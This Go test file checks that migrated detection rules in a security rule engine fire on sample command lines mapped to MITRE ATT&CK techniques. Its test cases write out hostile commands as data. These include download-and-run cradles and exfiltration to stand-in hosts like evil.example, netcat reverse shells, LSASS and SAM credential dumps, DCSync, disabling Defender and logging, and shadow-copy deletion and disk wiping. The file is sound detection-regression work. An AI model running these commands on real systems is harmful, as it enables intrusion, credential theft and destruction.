package rules

// Two-engine parity regression: migration 318 ported high-value cloud/AD attack
// detections from the api-server builtin SigmaEvaluator into the detection-server
// DB RuleEngine. The migration suite already locks that they compile, resolve
// their fields, and don't error at match — this drives each with a representative
// event so the parity rules are regression-locked to actually FIRE (detect), not
// merely parse. A field-mapping or condition regression that silently stops one
// from matching surfaces here.

import (
	"context"
	"testing"
)

// relocatedParityRules names the migration-322 parity rows that migration 377
// disabled, and the api builtin that absorbed each one. See the block comment on
// relocatedToBuiltin in migration_coverage_test.go for why these are inverted
// instead of removed.
//
// Both were absorbed as an extra `cmdline_only` branch on the existing builtin,
// because neither builtin was a superset on its own: they pinned the binary with
// Image|endswith and so missed crictl and wrapper invocations (sudo docker exec).
var relocatedParityRules = map[string]string{
	// migration 377
	"T1612 image build on host": "Container Image Build on Host",
	"T1609 container exec":      "Container Administration Command Execution",

	// migration 378. These five `(DB)` rows were flagged by a local A/B soak:
	// technique-level cross-engine dedup was still merging them with their
	// builtin twins, i.e. one event was still producing two alert rows inside the
	// api process. Four of the five builtins were already supersets (verified
	// term-by-term and branch-by-branch); the WinRM builtin was not, and gained a
	// winrs_cmdline branch first. See migration 378's header.
	"T1087.002 domain account discovery": "Domain Account Discovery",
	"T1087.002 via ADSI":                 "Domain Account Discovery",
	"T1069.002 net group domain":         "Domain Group Discovery",
	"T1069.002 privileged group":         "Domain Group Discovery",
	"T1135 net share":                    "Network Share Discovery",
	"T1135 get-smbshare":                 "Network Share Discovery",
	"T1135 invoke-sharefinder":           "Network Share Discovery",
	"T1018 nltest dclist":                "Remote System and Domain Controller Discovery",
	"T1018 net view domain":              "Remote System and Domain Controller Discovery",
	"T1018 powerview computer":           "Remote System and Domain Controller Discovery",
	"T1021.006 winrs":                    "WinRM Lateral Movement (winrs / PowerShell Remoting)",
	"T1021.006 enter-pssession":          "WinRM Lateral Movement (winrs / PowerShell Remoting)",

	// migration 430. T1552.003 は同じ検知を 4 本持っていた（builtin 2 本 +
	// DB 2 本）。技法 dedup が 1 行にまとめるため 4 本あることが観測できず、
	// #746 で 3 本だけ狭めて誤検知が残るという実害が出ている。builtin 1 本に
	// 統合し、DB 側 2 本（350 の parity 行と 386 の wave3 行）を無効化した。
	"T1552.003 bash history": "Shell History Credential Search",
}

func TestMigrationCloudADParityRulesFire(t *testing.T) {
	rules, err := extractMigrationRules()
	if err != nil {
		t.Fatalf("extract: %v", err)
	}
	enabled := rules[:0]
	for _, r := range rules {
		if r.Enabled {
			enabled = append(enabled, r)
		}
	}
	e := NewRuleEngine()
	e.LoadRules(enabled)
	e.SetPlatformGate(false) // parity rules are multi-platform; event OS is unset here

	cases := []struct {
		name string
		cmd  string
	}{
		{"T1526 cloud IAM discovery", `aws sts get-caller-identity`},
		{"T1562.008 cloud log tampering", `aws cloudtrail stop-logging --name org-trail`},
		{"T1087.002 domain account discovery", `net user /domain`},
		{"T1087.002 via ADSI", `powershell -c "([adsisearcher]'(objectClass=user)').FindAll()"`},
		{"T1558.004 AS-REP (Impacket)", `python3 GetNPUsers.py corp.local/ -usersfile u.txt -no-pass`},
		{"T1649 AD CS abuse (Certipy)", `certipy req -u user@corp.local -ca CORP-CA -template User`},
		// ── migration 319: exfil / relay / tunnel parity ──
		{"T1567.002 rclone cloud exfil", `rclone copy /data remote:bucket --transfers 8`},
		{"T1567.002 MEGAcmd exfil", `mega-put -c /srv/loot mega:/loot`},
		{"T1557.001 NTLM relay (ntlmrelayx)", `python3 ntlmrelayx.py -t ldap://dc01 -smb2support`},
		{"T1557.001 Responder poisoning", `python3 Responder.py -I eth0 -wrf`},
		{"T1558.001 golden ticket (Rubeus)", `Rubeus.exe golden /user:admin /krbtgt:deadbeef /domain:corp.local`},
		{"T1558.001 golden ticket (Impacket)", `python3 ticketer.py -nthash deadbeef -domain corp.local admin`},
		{"T1572 tunneling (chisel)", `chisel client 10.0.0.1:8080 R:socks`},
		{"T1572 tunneling (plink -R)", `plink.exe -R 3389:127.0.0.1:3389 attacker@vps`},
		// ── migration 320: cloud attack-surface parity ──
		{"T1580 cloud infra discovery (aws)", `aws ec2 describe-instances --region us-east-1`},
		{"T1580 cloud infra discovery (gcloud)", `gcloud compute instances list`},
		{"T1619 cloud storage discovery (aws)", `aws s3 ls s3://loot-bucket`},
		{"T1619 cloud storage discovery (gsutil)", `gsutil ls gs://corp-data`},
		{"T1098.001 additional cloud creds", `aws iam create-access-key --user-name svc-app`},
		{"T1098.003 additional cloud roles", `aws iam attach-user-policy --user-name svc --policy-arn arn:aws:iam::aws:policy/AdministratorAccess`},
		{"T1562.007 cloud firewall opening", `aws ec2 authorize-security-group-ingress --group-id sg-01 --protocol tcp --port 22 --cidr 0.0.0.0/0`},
		// ── migration 321: cloud persistence / collection / credential parity ──
		{"T1578 snapshot exfil (aws)", `aws ec2 modify-snapshot-attribute --snapshot-id snap-1 --create-volume-permission Add=[{UserId=999999}]`},
		{"T1578 snapshot create (gcloud)", `gcloud compute disks snapshot mydisk --snapshot-names exfil`},
		{"T1136.003 cloud account creation", `aws iam create-user --user-name backdoor-svc`},
		{"T1552.005 metadata cred theft", `curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/role`},
		{"T1552.005 gcp metadata", `curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/`},
		{"T1114.003 email forwarding rule", `powershell New-InboxRule -Name sync -ForwardTo attacker@evil.example`},
		// ── migration 322: container attack-surface parity ──
		{"T1610 privileged container", `docker run --privileged -v /:/host alpine sh`},
		{"T1611 container escape (nsenter)", `nsenter --target 1 --mount --uts --ipc --net --pid -- bash`},
		{"T1611 container escape (runc)", `cat /proc/self/exe > /tmp/x; echo release_agent breakout`},
		{"T1612 image build on host", `docker build -t evil:latest -f Dockerfile .`},
		{"T1609 container exec", `kubectl exec -it web-0 -- /bin/sh`},
		{"T1552.007 k8s SA token", `cat /var/run/secrets/kubernetes.io/serviceaccount/token`},
		// ── migration 323: Windows persistence parity ──
		{"T1546.001 AppInit DLLs", `reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" /v AppInit_DLLs /t REG_SZ /d C:\evil.dll /f`},
		{"T1037.001 logon script", `reg add "HKCU\Environment" /v UserInitMprLogonScript /t REG_SZ /d C:\evil.bat /f`},
		{"T1546.012 IFEO debugger", `reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d C:\Windows\System32\cmd.exe /f`},
		{"T1197 BITS download", `bitsadmin /transfer job http://evil.example/x.exe C:\Users\Public\x.exe`},
		{"T1197 BITS powershell", `powershell Start-BitsTransfer -Source http://evil.example/x.exe -Destination C:\x.exe`},
		// ── migration 324: credential access parity ──
		{"T1003.003 NTDS.dit (ntdsutil)", `ntdsutil "ac i ntds" "ifm" "create full C:\temp" q q`},
		{"T1003.003 NTDS.dit (file ref)", `vssadmin create shadow /for=C: && copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\ntds.dit`},
		{"T1003.004 LSA secrets (reg save)", `reg save HKLM\SECURITY C:\temp\security.hive`},
		{"T1003.005 cached creds (cachedump)", `cachedump -v`},
		{"T1552.006 GPP password", `findstr /S /I cpassword \\dc01\SYSVOL\corp\Policies\*.xml`},
		{"T1555.004 credential manager", `cmdkey /list`},
		// ── migration 325: defense-evasion LOLBin parity ──
		{"T1218.004 InstallUtil", `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /logtoconsole=false /u evil.dll`},
		{"T1218.007 msiexec remote", `msiexec /i https://evil.example/x.msi /qn`},
		{"T1218.009 regsvcs", `regsvcs.exe evil.dll`},
		{"T1220 XSL (wmic)", `wmic process list /format:"https://evil.example/x.xsl"`},
		{"T1218.003 CMSTP", `cmstp.exe /s C:\Users\Public\evil.inf`},
		// ── migration 326: lateral movement / collection parity ──
		{"T1021.003 DCOM", `powershell [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","10.0.0.5"))`},
		{"T1550.003 Pass-the-Ticket", `mimikatz "kerberos::ptt C:\temp\ticket.kirbi"`},
		{"T1115 clipboard", `powershell -c Get-Clipboard`},
		{"T1114.001 local email store", `python3 -c "import shutil; shutil.copy('archive.pst','/tmp/loot')"`},
		{"T1123 audio capture", `ffmpeg -f dshow -i audio="Microphone (Realtek)" C:\out.wav`},
		// ── migration 327: C2 / exfil channel parity ──
		{"T1219 RMM (anydesk)", `anydesk.exe --start-service`},
		{"T1102 web service C2", `curl -s https://raw.githubusercontent.com/evil/c2/main/task`},
		{"T1102 telegram bot C2", `curl -s "https://api.telegram.org/bot123:ABC/sendDocument" -F document=@loot.zip`},
		{"T1071.002 FTP exfil", `ftp -s:C:\Users\Public\upload.txt evil.example`},
		{"T1071.002 tftp put", `tftp -i 10.0.0.5 put C:\loot.zip`},
		{"T1071.003 mail exfil", `powershell Send-MailMessage -To a@b.example -Attachment loot.zip -SmtpServer mx.evil`},
		// ── migration 328: discovery / persistence / evasion parity ──
		{"T1615 group policy discovery", `gpresult /r /scope computer`},
		{"T1615 powerview GPO", `powershell Get-DomainGPOUserLocalGroupMapping -Identity Administrators`},
		{"T1136.002 domain account creation", `net user backdoor P@ssw0rd! /add /domain`},
		{"T1053.002 at job", `at.exe 13:00 /interactive cmd /c C:\evil.bat`},
		{"T1564.003 hidden window", `powershell -w hidden -enc SQBFAFgA`},
		{"T1564.004 NTFS ADS", `powershell -c "Get-Content -Path notes.txt -Stream evil"`},
		// ── migration 329: WMI subscription / MOTW / remaining LOLBin parity ──
		{"T1546.003 WMI subscription", `wmic /namespace:\\root\subscription PATH __EventFilter CREATE Name="evil", Query="SELECT * FROM __InstanceModificationEvent"`},
		{"T1553.005 MOTW bypass", `powershell Unblock-File -Path C:\Users\Public\downloaded.exe`},
		{"T1218.001 hh.exe remote", `hh.exe https://evil.example/payload.chm`},
		{"T1027.002 UPX packing", `upx -o packed.exe --best malware.exe`},
		{"T1569.002 PsExec service", `psexec.exe \\target -accepteula -s cmd /c whoami`},

		// ── migration 330: proxy-execution LOLBin parity (mshta/regsvr32/rundll32) ──
		{"T1218.005 mshta remote", `mshta.exe https://evil.example/payload.hta`},
		{"T1218.005 mshta vbscript", `mshta vbscript:Execute("CreateObject(\"Wscript.Shell\").Run(\"calc\")")`},
		{"T1218.010 regsvr32 squiblydoo", `regsvr32.exe /s /n /u /i:http://evil.example/x.sct scrobj.dll`},
		{"T1218.010 regsvr32 sct", `regsvr32 /s /i:C:\Users\Public\evil.sct scrobj.dll`},
		{"T1218.011 rundll32 javascript", `rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";alert()`},
		{"T1218.011 rundll32 url.dll", `rundll32.exe url.dll,OpenURL http://evil.example/x`},

		// ── migration 331: LSASS (T1003.001) / SAM (T1003.002) credential dump parity ──
		{"T1003.001 comsvcs MiniDump", `rundll32.exe C:\Windows\System32\comsvcs.dll,MiniDump 624 C:\temp\lsass.dmp full`},
		{"T1003.001 comsvcs ordinal", `rundll32 comsvcs.dll,#24 624 lsass.dmp full`},
		{"T1003.001 procdump lsass", `procdump.exe -accepteula -ma lsass.exe C:\temp\out.dmp`},
		{"T1003.001 pypykatz", `pypykatz live lsa`},
		{"T1003.002 SAM hive save", `reg save HKLM\SAM C:\temp\sam.hiv`},

		// ── migration 332: DCSync (T1003.006) / Kerberoasting (T1558.003) parity ──
		{"T1003.006 mimikatz dcsync", `mimikatz.exe "lsadump::dcsync /domain:corp.local /user:krbtgt"`},
		{"T1003.006 impacket just-dc", `secretsdump.py -just-dc corp.local/admin@dc01`},
		{"T1558.003 rubeus kerberoast", `Rubeus.exe kerberoast /outfile:hashes.txt`},
		{"T1558.003 impacket GetUserSPNs", `python3 GetUserSPNs.py corp.local/user -request`},

		// ── migration 333: inhibit recovery (T1490) / clear event logs (T1070.001) ──
		{"T1490 vssadmin shadows", `vssadmin.exe delete shadows /all /quiet`},
		{"T1490 bcdedit recovery", `bcdedit /set {default} recoveryenabled no`},
		{"T1490 wmi shadow delete", `powershell -c "Get-WmiObject Win32_ShadowCopy | ForEach-Object { $_.Delete() }"`},
		{"T1490 wbadmin catalog", `wbadmin delete catalog -quiet`},
		{"T1070.001 wevtutil cl", `wevtutil cl Security`},
		{"T1070.001 Clear-EventLog", `powershell Clear-EventLog -LogName System`},

		// ── migration 334: impair defenses (T1562.001 Defender / T1562.004 firewall) ──
		{"T1562.001 mp exclusion", `powershell Add-MpPreference -ExclusionPath C:\Users\Public`},
		{"T1562.001 mp disable", `powershell Set-MpPreference -DisableRealtimeMonitoring $true`},
		{"T1562.001 stop service", `net stop windefend`},
		{"T1562.001 mpcmdrun removedef", `"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All`},
		{"T1562.004 netsh firewall off", `netsh advfirewall set allprofiles state off`},

		// ── migration 335: ingress tool transfer (T1105 certutil / bitsadmin) ──
		{"T1105 certutil urlcache", `certutil.exe -urlcache -split -f http://evil.example/x.exe C:\temp\x.exe`},
		{"T1105 bitsadmin transfer", `bitsadmin /transfer job /download /priority high http://evil.example/x.exe C:\temp\x.exe`},

		// ── migration 336: native admin tool abuse (schtasks / sc / net) ──
		{"T1053.005 schtasks create", `schtasks.exe /create /tn Updater /tr C:\temp\evil.exe /sc onlogon`},
		{"T1053.005 Register-ScheduledTask", `powershell -c "Register-ScheduledTask -TaskName Updater -Action $a"`},
		{"T1543.003 sc create binpath", `sc.exe create evilsvc binPath= C:\temp\evil.exe start= auto`},
		{"T1543.003 New-Service", `powershell New-Service -Name evilsvc -BinaryPathName C:\temp\evil.exe`},
		{"T1136.001 net user add", `net user backdoor P@ssw0rd /add`},
		{"T1098 net localgroup admin add", `net localgroup administrators backdoor /add`},

		// ── migration 337: remaining LOLBin proxy execution (control/odbcconf/verclsid/pubprn) ──
		{"T1218.002 control cpl", `control.exe C:\Users\Public\evil.cpl`},
		{"T1218.002 rundll Control_RunDLL", `rundll32.exe shell32.dll,Control_RunDLL C:\temp\evil.cpl`},
		{"T1218.008 odbcconf regsvr", `odbcconf.exe /a {REGSVR C:\temp\evil.dll}`},
		{"T1218.012 verclsid", `verclsid.exe /S /C {CLSID-evil}`},
		{"T1216.001 pubprn", `cscript.exe C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs 127.0.0.1 script:http://evil.example/x.sct`},

		// ── migration 338: defense evasion / impact (logging disable / permissions / service stop) ──
		{"T1562.002 auditpol disable", `auditpol /set /category:* /success:disable /failure:disable`},
		{"T1562.002 wevtutil disable", `wevtutil sl Security /e:false`},
		{"T1562.002 stop eventlog", `powershell Stop-Service EventLog -Force`},
		{"T1222.001 icacls grant everyone", `icacls C:\data /grant Everyone:F /T`},
		{"T1222.001 takeown", `takeown /f C:\Windows\System32\evil.dll /a`},
		{"T1489 sc stop defender", `sc stop windefend`},
		{"T1489 stop-service veeam", `powershell Stop-Service -Name VeeamBackup`},

		// ── migration 339: unsecured credentials (T1552 files/registry/keys) ──
		{"T1552.001 findstr password", `findstr /s /i password C:\inetpub\*.config`},
		{"T1552.001 grep password", `grep -r password /etc /home`},
		{"T1552.002 reg query password", `reg query HKLM\SOFTWARE /f password /t REG_SZ /s`},
		{"T1552.002 ps get-itemproperty", `powershell Get-ItemProperty -Path HKCU:\Software\foo | select password`},
		{"T1552.004 gci id_rsa", `powershell Get-ChildItem -Recurse -Filter id_rsa C:\Users`},
		{"T1552.004 find pem", `find / -name *.pem 2>/dev/null`},

		// ── migration 340: AD/network discovery (T1018 / T1069.002 / T1135) ──
		{"T1018 nltest dclist", `nltest /dclist:corp.local`},
		{"T1018 net view domain", `net view /domain`},
		{"T1018 powerview computer", `powershell Get-ADComputer -Filter *`},
		{"T1069.002 net group domain", `net group "Domain Admins" /domain`},
		{"T1069.002 privileged group", `net localgroup "enterprise admins"`},
		{"T1135 net share", `net share`},
		{"T1135 get-smbshare", `powershell Get-SmbShare`},
		{"T1135 invoke-sharefinder", `powershell Invoke-ShareFinder -CheckShareAccess`},

		// ── migration 341: lateral/remote execution (T1047 / T1021.006 / T1021.004) ──
		{"T1047 wmic process call", `wmic /node:target process call create "cmd /c calc.exe"`},
		{"T1021.006 winrs", `winrs -r:target -u:admin cmd.exe`},
		{"T1021.006 enter-pssession", `powershell Enter-PSSession -ComputerName target`},
		{"T1021.004 plink pw", `plink.exe -pw Passw0rd admin@10.0.0.5`},
		{"T1021.004 sshpass", `sshpass -p Passw0rd ssh admin@10.0.0.5`},

		// ── migration 342: indirect exec / obfuscation (T1202 / T1027.004 / T1140) ──
		{"T1202 forfiles", `forfiles /p C:\Windows /m *.txt /c "cmd /c calc.exe"`},
		{"T1027.004 gcc temp", `gcc /tmp/payload.c -o /tmp/payload`},
		{"T1140 base64 decode", `echo ZXZpbA== | base64 -d | bash`},

		// ── migration 343: collection / trust store (T1560.001 / T1113 / T1553.004) ──
		{"T1560.001 7z password", `7z a -psecret stage.7z C:\Users\victim\Documents\*`},
		{"T1113 CopyFromScreen", `powershell -c "$g.CopyFromScreen(0,0,0,0,$sz)"`},
		{"T1113 nircmd screenshot", `nircmd.exe savescreenshot C:\temp\cap.png`},
		{"T1553.004 certutil addstore root", `certutil -addstore -f root C:\temp\evil.cer`},

		// ── migration 344: Linux privilege escalation (T1548.003 / T1548.001 / T1068) ──
		{"T1548.003 sudo find exec", `sudo find / -exec /bin/sh \; -quit`},
		{"T1548.001 find suid", `find / -perm -4000 -type f 2>/dev/null`},
		{"T1068 pkexec pwnkit", `GCONV_PATH=. pkexec /bin/sh`},

		// ── migration 345: C2 proxy / non-app protocol (T1090.001 / T1090.003 / T1095) ──
		{"T1090.001 netsh portproxy", `netsh interface portproxy add v4tov4 listenport=4444 connectaddress=10.0.0.5`},
		{"T1090.003 onion", `curl --socks5 127.0.0.1:9050 http://abcdef.onion/beacon`},
		{"T1090.003 tor binary", `tor.exe -f C:\tor\torrc`},
		{"T1095 ncat revshell", `ncat -e /bin/bash 10.0.0.5 4444`},
		{"T1095 nc listen", `nc -lvp 4444 -e /bin/sh`},

		// ── migration 346: Linux/macOS credential dump (T1003.007 / T1003.008 / T1555.001) ──
		{"T1003.007 proc mem", `dd if=/proc/1234/mem bs=1 skip=140000 count=4096 2>/dev/null`},
		{"T1003.008 cat shadow", `cat /etc/shadow > /tmp/s.txt`},
		{"T1555.001 keychain dump", `security dump-keychain -d login.keychain`},

		// ── migration 347: discovery #2 (T1046 / T1482 / T1518.001) ──
		{"T1046 nmap", `nmap -sS -p- 10.0.0.0/24`},
		{"T1046 nc scan", `nc -zv 10.0.0.5 1-1024`},
		{"T1482 nltest trusts", `nltest /domain_trusts /all_trusts`},
		{"T1518.001 falcon", `ps aux | grep falcon-sensor`},

		// ── migration 348: macOS persistence (T1543.001 / T1547.015 / T1546.014) ──
		{"T1543.001 launchctl", `launchctl load -w /Library/LaunchDaemons/com.evil.plist`},
		{"T1543.001 plist write", `cp evil.plist /Library/LaunchAgents/com.evil.plist`},
		{"T1547.015 login item", `osascript -e 'tell application "System Events" to make new login item at end'`},
		{"T1546.014 emond", `echo payload > /etc/emond.d/rules/evil.plist`},

		// ── migration 349: injection / token / reflective load (T1055.001 / T1134 / T1620) ──
		{"T1055.001 mavinject", `mavinject.exe 1234 /INJECTRUNNING C:\temp\evil.dll`},
		{"T1134 runas netonly", `runas /netonly /user:CORP\admin cmd.exe`},
		{"T1620 reflective load", `powershell -c "[Reflection.Assembly]::Load($bytes)"`},

		// ── migration 350: browser/history creds + PtH (T1539 / T1552.003 / T1550.002) ──
		{"T1539 login data", `esentutl.exe /y "C:\Users\v\AppData\Local\Google\Chrome\User Data\Default\Login Data" /d C:\temp\ld`},
		{"T1552.003 bash history", `cat /home/victim/.bash_history | grep -i pass`},
		{"T1550.002 cme hash", `crackmapexec smb 10.0.0.0/24 -u admin -H aad3b435b51404eeaad3b435b51404ee`},

		// ── migration 351: impact / destruction (T1485 / T1531 / T1561) ──
		{"T1485 sdelete", `sdelete.exe -p 3 -s C:\data`},
		{"T1531 net user delete", `net user victim /delete`},
		{"T1561 clear-disk", `powershell Clear-Disk -Number 0 -RemoveData -Confirm:$false`},

		// ── migration 352: anti-forensic / hiding (T1564.001 / T1222.002 / T1070.003) ──
		{"T1564.001 attrib hide", `attrib +h +s C:\Users\Public\evil.exe`},
		{"T1222.002 chmod suid", `chmod u+s /tmp/rootshell`},
		{"T1070.003 clear history", `history -c; unset HISTFILE`},

		// ── migration 353: DNS/alt-proto C2 + cradle (T1071.004 / T1048 / T1071.001) ──
		{"T1071.004 dnscat", `dnscat2 --dns server=evil.example,port=53`},
		{"T1048 curl upload", `curl -T /tmp/data.zip http://evil.example/up`},
		{"T1071.001 ps cradle", `powershell IEX (New-Object Net.WebClient).DownloadString('http://evil.example/x')`},

		// ── migration 354: hijack / boot / DCShadow (T1496 / T1542.003 / T1207) ──
		{"T1496 xmrig", `xmrig -o stratum+tcp://pool.evil:3333 --donate-level 0`},
		{"T1542.003 bcdedit recovery", `bcdedit /set {default} recoveryenabled No`},
		{"T1207 dcshadow", `mimikatz lsadump::dcshadow /object:CN=admin,DC=corp`},

		// ── migration 355: discovery #3 / removable media (T1201 / T1614.001 / T1091) ──
		{"T1201 chage", `chage -l root`},
		{"T1614.001 timedatectl", `timedatectl status`},
		{"T1091 autorun", `echo [autorun] > /media/usb/autorun.inf`},

		// ── migration 356: VNC / password manager / Gatekeeper (T1021.005 / T1555.005 / T1553.001) ──
		{"T1021.005 vncviewer", `vncviewer.exe 10.0.0.5:5900`},
		{"T1555.005 keepass", `cp /home/victim/.config/keepass/Database.kdbx /tmp/loot`},
		{"T1553.001 spctl", `spctl --master-disable`},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			ev := map[string]interface{}{
				"type": "process", "agent_id": "h", "command_line": c.cmd,
			}
			m, err := e.Evaluate(context.Background(), ev)
			if err != nil {
				t.Fatalf("Evaluate: %v", err)
			}
			// Two of migration 322's parity rows were handed to the api builtins by
			// migration 377 (P4-6 made both engines evaluate them, so one event
			// produced two alert rows). Inverted rather than deleted, for the same
			// reason as in migration_coverage_test.go: a deleted case cannot notice a
			// re-enable, and a skipped one asserts nothing while reading as covered.
			// The builtin's coverage is asserted in
			// internal/detection/db_rule_builtin_port_test.go.
			if builtin, moved := relocatedParityRules[c.name]; moved {
				if len(m) > 0 {
					t.Fatalf("%s still fires in the DB engine, but migration 377 disabled its "+
						"migration-322 row and handed it to the api builtin %q — two engines "+
						"matching the same event is the double-counting 377 removes",
						c.name, builtin)
				}
				return
			}
			if len(m) == 0 {
				t.Fatalf("parity rule did not fire for %s (cmd=%q) — a field-mapping or condition regression", c.name, c.cmd)
			}
		})
	}
}
